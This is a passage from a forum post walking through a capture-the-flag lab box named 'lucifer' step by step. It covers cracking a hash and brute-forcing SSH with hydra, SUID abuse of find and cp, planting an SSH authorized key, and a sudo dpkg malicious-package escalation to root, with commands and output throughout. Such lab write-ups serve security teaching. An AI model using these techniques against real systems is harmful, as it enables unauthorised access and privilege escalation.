root        14  0.0  0.0      0     0 ?        S    07:25   0:00 [cpuhp/0]
root        15  0.0  0.0      0     0 ?        S    07:25   0:00 [kdevtmpfs]
root        16  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [netns]
root        17  0.0  0.0      0     0 ?        S    07:25   0:00 [kauditd]
root        18  0.0  0.0      0     0 ?        S    07:25   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S    07:25   0:00 [oom_reaper]
root        20  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [writeback]
root        21  0.0  0.0      0     0 ?        S    07:25   0:00 [kcompactd0]
root        22  0.0  0.0      0     0 ?        SN   07:25   0:00 [ksmd]
root        23  0.0  0.0      0     0 ?        SN   07:25   0:00 [khugepaged]
root        24  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [crypto]
root        25  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kintegrityd]
root        26  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kblockd]
root        27  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [edac-poller]
root        28  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [devfreq_wq]
root        29  0.0  0.0      0     0 ?        S    07:25   0:00 [watchdogd]
root        30  0.0  0.0      0     0 ?        S    07:25   0:00 [kswapd0]
root        48  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ipv6_addrconf]
root        50  0.0  0.0      0     0 ?        I    07:25   0:00 [kworker/u2:1-events_unbound]
root        59  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kstrp]
root        96  0.0  0.0      0     0 ?        I    07:25   0:01 [kworker/0:2-memcg_kmem_cache]
root       106  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ata_sff]
root       108  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_0]
root       109  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_0]
root       110  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_1]
root       112  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_1]
root       113  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_2]
root       115  0.0  0.0      0     0 ?        I    07:25   0:00 [kworker/u2:2-flush-8:0]
root       116  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_2]
root       153  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/0:1H-kblockd]
root       184  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/u3:0]
root       186  0.0  0.0      0     0 ?        S    07:25   0:00 [jbd2/sda1-8]
root       187  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ext4-rsv-conver]
root       221  0.0  0.7  32188  7752 ?        Ss   07:25   0:00 /lib/systemd/systemd-journald
root       249  0.0  0.5  22452  5452 ?        Ss   07:25   0:00 /lib/systemd/systemd-udevd
systemd+   283  0.0  0.6  93080  6356 ?        Ssl  07:25   0:00 /lib/systemd/systemd-timesyncd
root       323  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ttm_swap]
root       324  0.0  0.0      0     0 ?        S    07:25   0:00 [irq/18-vmwgfx]
message+   367  0.0  0.4   8972  4348 ?        Ss   07:25   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       368  0.0  0.7  19400  7092 ?        Ss   07:25   0:00 /lib/systemd/systemd-logind
root       369  0.0  0.2   8504  2768 ?        Ss   07:25   0:00 /usr/sbin/cron -f
root       370  0.0  0.3 225824  3820 ?        Ssl  07:25   0:00 /usr/sbin/rsyslogd -n -iNONE
root       382  0.0  0.5   9488  5692 ?        Ss   07:25   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
root       406  0.0  1.9 110360 20204 ?        Ssl  07:25   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       408  0.0  0.1   5612  1504 tty1     Ss+  07:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql      490  0.0  9.3 1264720 94088 ?       Ssl  07:25   0:02 /usr/sbin/mysqld
root       499  0.0  0.6  15852  7032 ?        Ss   07:25   0:00 /usr/sbin/sshd -D
root       539  0.0  2.4 215156 24616 ?        Ss   07:26   0:00 /usr/sbin/apache2 -k start
proftpd    670  0.0  0.3  24016  3676 ?        Ss   07:26   0:00 proftpd: (accepting connections)
www-data  1109  0.0  3.4 220452 34668 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
www-data  1110  0.0  3.5 218424 36148 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
www-data  1111  0.0  3.8 218488 38480 ?        S    07:26   0:01 /usr/sbin/apache2 -k start
www-data  1112  0.0  3.3 218744 33468 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
www-data  1179  0.0  3.4 220516 34476 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
www-data  1513  0.0  3.7 218680 37932 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
www-data  1514  0.0  3.2 218468 32652 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
www-data  1515  0.0  3.7 216372 37924 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
www-data  1516  0.0  3.7 218680 37984 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
www-data  1519  0.0  3.7 216376 37868 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
root      1605  0.0  0.0      0     0 ?        I    07:57   0:00 [kworker/0:1-ata_sff]
root      1622  0.0  0.0      0     0 ?        I    08:02   0:00 [kworker/0:0-ata_sff]
www-data  1645  0.0  0.0   2388   700 ?        S    08:03   0:00 sh -c ps aux
www-data  1646  0.0  0.2   7640  2700 ?        R    08:03   0:00 ps aux
</code></pre>
<p>nothing weird or special in process list !</p>
<p>the passwd file:</p>
<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
_apt:x:103:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
john:x:1000:1000:john,,,:/home/john:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lisa:x:1001:1001:,,,:/home/lisa:/bin/bash
henri:x:1002:1002:,,,:/home/henri:/bin/bash
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
wordpressftp:x:1003:1003:,,,:/var/www/html:/bin/rbash
victor:x:1004:1004:,,,:/home/victor:/bin/bash
trevor:x:1005:1005:,,,:/home/trevor:/bin/bash
</code></pre>
<p>and what we need from it specially is the users that have access to consoles like : bash / sh / rbash …</p>
<pre><code>root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john,,,:/home/john:/bin/bash
lisa:x:1001:1001:,,,:/home/lisa:/bin/bash
henri:x:1002:1002:,,,:/home/henri:/bin/bash
wordpressftp:x:1003:1003:,,,:/var/www/html:/bin/rbash
victor:x:1004:1004:,,,:/home/victor:/bin/bash
trevor:x:1005:1005:,,,:/home/trevor:/bin/bash
</code></pre>
<p>the users in the box are:</p>
<pre><code>henri
john
lisa
root
trevor
victor
wordpressftp
</code></pre>
<p>now let’s try to get some passwords …</p>
<p>there is a weird file secret.php</p>
<pre><code>&lt;?php //
Echo "API:";
echo md5(base64_encode("
This stupid webadmin doesn't give me log access.. 
but i have his creds {victor:00a00cfc5745c3b59202ab06a67bb2dc} 
"));
?&gt;
</code></pre>
<p>containing a MD5 hash (the length is 32)</p>
<blockquote>
<p>00a00cfc5745c3b59202ab06a67bb2dc:irminsul</p>
</blockquote>
<p>let’s continue looking for passwords …</p>
<p>we don’t have access to home users …</p>
<p>so let’s make a quick brute forcing for SSH with hydra</p>
<p><code>&gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh</code></p>
<p>-L is for users list</p>
<p>-P is for passwordlist</p>
<p>ssh://192.168.1.148</p>
<p>the IP address of the server</p>
<p>-s for port (22)</p>
<p>ssh ==&gt; the service name (ftp , smtp …)</p>
<pre><code>&gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-30 14:12:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:7/p:0), ~3 tries per task
[DATA] attacking ssh://192.168.1.148:22/
[22][ssh] host: 192.168.1.148   login: victor   password: irminsul
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-30 14:12:12
</code></pre>
<p>and we have some true credentianls</p>
<blockquote>
<p>[22][ssh] host: 192.168.1.148 login: victor password: irminsul</p>
</blockquote>
<p>let’s go to ssh</p>
<p>and we are in <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code>&gt; ssh <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="196f707a6d766b5928202b37282f21372837282d21">[email&#160;protected]</a>
The authenticity of host '192.168.1.148 (192.168.1.148)' can't be established.
ECDSA key fingerprint is SHA256:qOCG5GMfENFo0Ox4TwxKShT8MsvBvYvR/ImJ1NHt5Go.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.148' (ECDSA) to the list of known hosts.
<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="0e78676d7a617c4e3f373c203f3836203f203f3a36">[email&#160;protected]</a>'s password:
Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 24 15:48:26 2020 from 192.168.1.24
victor@lucifer:~$

victor@lucifer:~$ id
uid=1004(victor) gid=1004(victor) groups=1004(victor)
victor@lucifer:~$ pwd
/home/victor
victor@lucifer:~$ ls -la
total 32
drwxr-x--- 4 victor victor 4096 Mar 25 06:08 .
drwxr-xr-x 7 root   root   4096 Mar 23 16:29 ..
-rw-r--r-- 1 victor victor  220 Mar 19 06:43 .bash_logout
-rw-r--r-- 1 victor victor 3526 Mar 19 06:43 .bashrc
drwxr-xr-x 2 victor victor 4096 Mar 19 15:32 bin
drwx------ 3 victor victor 4096 Mar 19 08:10 .gnupg
-rw-r--r-- 1 victor victor  675 Mar 19 06:43 .profile
-rw------- 1 victor victor   53 Mar 19 17:27 .Xauthority
victor@lucifer:~$ cd bin
victor@lucifer:~/bin$ ls -la
total 320
drwxr-xr-x 2 victor victor   4096 Mar 19 15:32 .
drwxr-x--- 4 victor victor   4096 Mar 25 06:08 ..
-rwsrwsrwt 1 john   john   315904 Mar 19 06:50 find
victor@lucifer:~/bin$
</code></pre>
<p>so we are in victor home folder and inside it we have a folder named bin with a weirdo file privileges …</p>
<p><code>-rwsrwsrwt 1 john john 315904 Mar 19 06:50 find</code></p>
<p>we are in victor folder and the file have john suid !</p>
<p>by going to GTFOBins we’ll get more about these kind of exploitations …</p>
<pre><code>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
</code></pre>
<p>let’s search for find and cause we have a normal user privileges we can only use SUID exploitation not the SUDO one</p>
<p><code>./find . -exec /bin/bash -p \; -quit</code></p>
<p>I changed sh to bash cause I like bash more :p, let’s run it</p>
<p>and we are john now <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code>victor@lucifer:~/bin$ ./find . -exec /bin/bash -p \; -quit
bash-5.0$ id
uid=1004(victor) gid=1004(victor) euid=1000(john) egid=1000(john) groups=1000(john),1004(victor)
</code></pre>
<p>let’s go to the john home folder</p>
<p>we have a weird hidden file</p>
<pre><code>bash-5.0$ cd /home/john
bash-5.0$ ls -la
total 32
drwxr-x--- 3 john john 4096 Mar 25 04:24 .
drwxr-xr-x 7 root root 4096 Mar 23 16:29 ..
-rw-r--r-- 1 john john  220 Mar 18 19:31 .bash_logout
-rw-r--r-- 1 john john 3526 Mar 18 19:31 .bashrc
drwx------ 3 john john 4096 Mar 18 19:32 .gnupg
-rw-r--r-- 1 john john   12 Mar 19 08:38 .private
-rw-r--r-- 1 john john  675 Mar 18 19:31 .profile
-rw------- 1 john john  106 Mar 19 04:14 .Xauthority
bash-5.0$ cat .private
dropbox2010
</code></pre>
<p>it looks like we have another password <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>let’s do another run with hydra with the new password</p>
<pre><code>&gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-30 14:23:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:7/p:0), ~4 tries per task
[DATA] attacking ssh://192.168.1.148:22/
[22][ssh] host: 192.168.1.148   login: lisa   password: dropbox2010
[22][ssh] host: 192.168.1.148   login: victor   password: irminsul
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-30 14:23:48
</code></pre>
<p>so we have another user access</p>
<blockquote>
<p>[22][ssh] host: 192.168.1.148 login: lisa password: dropbox2010</p>
</blockquote>
<p>we are in</p>
<pre><code>lisa@lucifer:~$ id
uid=1001(lisa) gid=1001(lisa) groups=1001(lisa)
lisa@lucifer:~$ pwd
/home/lisa
lisa@lucifer:~$ ls -la
total 32
drwxr-x--- 5 lisa lisa 4096 Mar 30 08:23 .
drwxr-xr-x 7 root root 4096 Mar 23 16:29 ..
-rw-r--r-- 1 lisa lisa  220 Mar 18 19:34 .bash_logout
-rw-r--r-- 1 lisa lisa 3560 Mar 19 15:01 .bashrc
drwxr-xr-x 2 lisa lisa 4096 Mar 23 19:23 bin
drwx------ 3 lisa lisa 4096 Mar 30 08:23 .gnupg
drwxr-xr-x 3 lisa lisa 4096 Mar 19 15:01 .local
-rw-r--r-- 1 lisa lisa  675 Mar 18 19:34 .profile
lisa@lucifer:~$

looks like we have another bin folder !

lisa@lucifer:~$ cd bin
lisa@lucifer:~/bin$ ls -la
total 152
drwxr-xr-x 2 lisa  lisa   4096 Mar 23 19:23 .
drwxr-x--- 5 lisa  lisa   4096 Mar 30 08:23 ..
-rwsrws--T 1 henri lisa 146880 Mar 19 14:44 copy
lisa@lucifer:~/bin$
</code></pre>
<p>and also another file with <strong>henri</strong> privileges and <strong>lisa</strong> too this time !</p>
<p>by going back to GTFOBins and looking for any exploitation of this binary file</p>
<p>in linux we have cp and not copy so it the same file</p>
<p><code>./copy -R /home/henri/ /home/lisa/bin/copied/</code></p>
<p>-R for recrusive</p>
<p>for kind of folders and files stuff I like to use WINSCP</p>
<p>it’s a good interface that let you browse the files and folders <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>I created a new folder named copied iside of our bin folder (lisa’s bin folder) and give it 777 permissions so everyone can write there !</p>
<p>let’s run and see what we got ! …</p>
<p>and yes we were able to copy all the henri home folder inside our “copied” folder</p>
<p>we have a text file “flag.txt” containing this :</p>
<p>You’re doning well. .</p>
<p>keep going…</p>
<p>it’s says that we have to keep going …</p>
<p>nothing here what took my attention is the folder .ssh that we didn’t see in other user’s home</p>
<p>so let’s create an authorise key and try to copy it from lisa folder this time to henri .ssh folder <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>am going to use puttygen for windows</p>
<p>all what you have to do is clicking on generate and save the private key and also copy the authorized key</p>
<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoC/2V3NrKHIWnWh+VLQiXeUcRWnmAbmxEy0dOJrf/OLp6XbNWYvmsA/HujVxWz6OPNIAfAo3vntx4mzd4crpbMqF2c2ZZgDOdEwEMIBPkMf2yd58Ss7CewaP6jHLB/JbqSWjD0PhHv5WcwtsfBw7C1/C9qLB0CQcDitEyXy2YMATwmrQpKha9cu+gbc36laWIivKW3FCUwloNGtnajAJZi0i6lk0D36PM4qJo+JR0jBaSAlhgIOhsBoRpLVlNgW2SHGOnkSWmHKUjH3mKoFIuttbTCbBtg1EJzcmLK973fEAgXIXshZAwELgtPFebiu1pU6921G/ELFdCt2bn+aSTQ== rsa-key-20200330</code></p>
<p>I created a new file in lisa bin folder name “authorized_keys” so now let’s copy it for henri’s .ssh folder !</p>
<p><code>copy /home/lisa/bin/authorized_keys /home/henri/.ssh/authorized_keys</code></p>
<p>and try to login from ssh</p>
<p>and we are in <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code>login as: henri
Authenticating with public key "rsa-key-20200330"
Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henri@lucifer:~$ id
uid=1002(henri) gid=1002(henri) groups=1002(henri)
henri@lucifer:~$
</code></pre>
<p>as we see our authorized key was copied and cause of that we are in</p>
<p>I’ll make a little pause to get some coffee and I’ll get back …</p>
<p>am back !</p>
<p>so let’s run linenum.sh it a tool for linux enumeration</p>
<p>or let’s run linpeas.sh I like it more</p>
<p>what I like in this tool it colorize the results so the most dangerous things they are looking in yellow and red</p>
<p>You can write SUID file: /usr/local/bin/cmd</p>
<p>let’s run this file and see what will happen !</p>
<p>we can only type cmd cause we have it inside OUR PATH</p>
<p>or we can use the full path</p>
<pre><code>henri@lucifer:~/dust$ /usr/local/bin/cmd
trevor@lucifer:~/dust$
</code></pre>
<p>looks like we are with <strong>trevor</strong> now !</p>
<p>nothing in his home folder let’s use again that enumerating tool !</p>
<p>we have a kind of sudo binary file we can use without password</p>
<pre><code>[+] Testing 'sudo -l' without password &amp; /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for trevor on lucifer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User trevor may run the following commands on lucifer:
    (root) NOPASSWD: /usr/bin/dpkg
</code></pre>
<p>From GTFOBins</p>
<pre><code>TF=$(mktemp -d)echo 'exec /bin/sh' &gt; $TF/x.shfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TFsudo dpkg -i x_1.0_all.deb
</code></pre>
<p>so to exploit that we need to install FPM</p>
<blockquote>
<pre><code>Effing package management! Build packages for multiple platforms (deb, rpm, etc) with great ease and sanity.
</code></pre>
</blockquote>
<p>we can install that in windows if you have ruby but you’ll face huge problems</p>
<p>So we are going to use kali linux I already have a VM running …</p>
<p>if you don’t have ruby</p>
<p>you can install it in debian</p>
<blockquote>
<p>apt-get install ruby ruby-dev rubygems build-essential</p>
</blockquote>
<p>and after that you have to install FPM with gem</p>
<blockquote>
<p>gem install --no-document fpm</p>
</blockquote>
<p>I already have it in my kali so let’s go directly to the exploitation …</p>
<p>I have already the package file “x_1.0_all.deb”</p>
<p>Don’t know what goes wrong with my kali but let’s upload the package file and run it</p>
<p>Oooh god what I did <img src="../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>So we get the root privileges and that how I solved this box</p>
<pre><code>    trevor@lucifer:/tmp$ sudo dpkg -i x_1.0_all.deb
    Selecting previously unselected package x.
    (Reading database ... 40777 files and directories currently installed.)
    Preparing to unpack x_1.0_all.deb ...
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # cd /root
    # ls
    flag.txt
    # cat flag
    cat: flag: No such file or directory
    # cat flag.txt
    WELl DONE

    echo "THISISTHEFLAGTHISISTHEFLAG\!\!\!\@\@\@###" | base64 &gt; `thisistheflag.txt`
</code></pre>
</details>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="20195.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-08-01T10:58:02Z" class="post-time">
August 1, 2020, 10:58am
</time>
<meta itemprop="dateModified" content="2020-08-01T10:58:02Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
